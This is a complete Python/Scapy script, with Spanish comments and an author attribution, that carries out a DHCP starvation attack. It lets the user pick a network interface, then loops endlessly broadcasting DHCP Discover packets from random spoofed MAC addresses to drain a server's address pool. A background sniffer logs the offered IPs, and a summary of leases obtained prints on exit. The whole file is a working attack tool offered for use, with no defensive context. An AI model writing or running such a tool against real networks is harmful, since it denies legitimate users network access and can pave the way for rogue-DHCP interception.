#!/usr/bin/env python3

#########################################################
# Ataque:  DHCP Starvation
# Autor:   Luiggy Encarnacion
#########################################################

from scapy.all import *
import random
import sys
import time
import signal
import threading

stats = {
    "count"     : 0,
    "start_time": None
}

# ─────────────────────────────────────────
def banner(title):
    width = 40
    print()
    print("  ╔" + "═" * width + "╗")
    print("  ║" + title.center(width) + "║")
    print("  ╚" + "═" * width + "╝")

def separator():
    print("  " + "─" * 62)

def row(tiempo, mac, ip):
    print(f"  {tiempo:<8} {mac:<22}  →  {ip:<16}")

def elapsed_str():
    elapsed    = int(time.time() - stats["start_time"])
    mins, secs = divmod(elapsed, 60)
    return f"{mins:02d}:{secs:02d}"

# ─────────────────────────────────────────
def select_interface():
    try:
        from scapy.all import get_if_list
        interfaces = get_if_list()
    except Exception:
        interfaces = []

    if not interfaces:
        print("  [!] No se detectaron interfaces de red.")
        iface = input("  Ingrese el nombre de la interfaz manualmente: ").strip()
        return iface

    print()
    print("  Interfaces de red disponibles:")
    for i, iface in enumerate(interfaces, 1):
        print(f"    [{i}] {iface}")
    print()

    while True:
        seleccion = input("  Seleccione interfaz (número o nombre): ").strip()
        if seleccion.isdigit():
            idx = int(seleccion) - 1
            if 0 <= idx < len(interfaces):
                return interfaces[idx]
            else:
                print("  [!] Número fuera de rango. Intente de nuevo.")
        elif seleccion in interfaces:
            return seleccion
        else:
            print("  [!] Interfaz no válida. Intente de nuevo.")

def solicitar_parametros():
    banner("DHCP Starvation Attack")
    print()

    try:
        iface = select_interface()
        print()
    except KeyboardInterrupt:
        print()
        print("  [!] Saliendo.")
        sys.exit(0)

    return iface

# ─────────────────────────────────────────
def random_mac():
    mac    = [random.randint(0, 255) for _ in range(6)]
    mac[0] &= 0xFE
    return ':'.join(f'{b:02x}' for b in mac)

def mac_to_bytes(mac_str):
    return bytes(int(x, 16) for x in mac_str.split(':'))

def build_discover(fake_mac):
    fake_mac_bytes = mac_to_bytes(fake_mac)
    xid            = random.randint(1, 0xFFFFFFFF)
    return (
        Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff") /
        IP(src="0.0.0.0", dst="255.255.255.255") /
        UDP(sport=68, dport=67) /
        BOOTP(chaddr=fake_mac_bytes, xid=xid) /
        DHCP(options=[
            ("message-type", "discover"),
            ("param_req_list", [1, 3, 6, 15]),
            "end"
        ])
    )

# ─────────────────────────────────────────
leases = {}

def sniffer(iface):
    def handle_offer(pkt):
        if not pkt.haslayer(DHCP):
            return
        if pkt[DHCP].options[0][1] == 2:  # DHCP Offer
            mac_bytes  = pkt[BOOTP].chaddr[:6]
            client_mac = ':'.join(f'{b:02x}' for b in mac_bytes)
            offered_ip = pkt[BOOTP].yiaddr
            if client_mac not in leases:
                leases[client_mac] = offered_ip
                row(elapsed_str(), client_mac, offered_ip)

    sniff(
        iface=iface,
        filter="udp and (port 67 or port 68)",
        prn=handle_offer,
        store=0
    )

# ─────────────────────────────────────────
def print_summary(sig=None, frame=None):
    elapsed    = max(int(time.time() - stats["start_time"]), 1)
    mins, secs = divmod(elapsed, 60)
    avg        = stats["count"] // elapsed

    print()
    banner("Resumen Final")
    print(f"  Solicitudes enviadas : {stats['count']}")
    print(f"  Rate promedio        : {avg} pkt/s")
    print(f"  Tiempo activo        : {mins:02d}:{secs:02d}")
    print(f"  IPs obtenidas        : {len(leases)}")
    separator()
    print("  [+] Saliendo.")
    print()
    sys.exit(0)

# ─────────────────────────────────────────
def dhcp_starvation(iface):
    while True:
        fake_mac = random_mac()
        discover = build_discover(fake_mac)
        sendp(discover, iface=iface, verbose=False)
        stats["count"] += 1

# ─────────────────────────────────────────
def main():
    signal.signal(signal.SIGINT, print_summary)

    IFACE = solicitar_parametros()

    banner("DHCP Starvation Attack")
    print(f"  Interfaz  : {IFACE}")
    separator()
    print(f"  [*] Iniciando DHCP Starvation...")
    print(f"  [*] Agotando pool con MACs aleatorias...")
    print()

    print(f"  {'Tiempo':<8} {'MAC Falsa':<22}  {'IP Obtenida':<16}")
    separator()

    stats["start_time"] = time.time()

    t = threading.Thread(target=sniffer, args=(IFACE,), daemon=True)
    t.start()

    dhcp_starvation(IFACE)

if __name__ == "__main__":
    main()
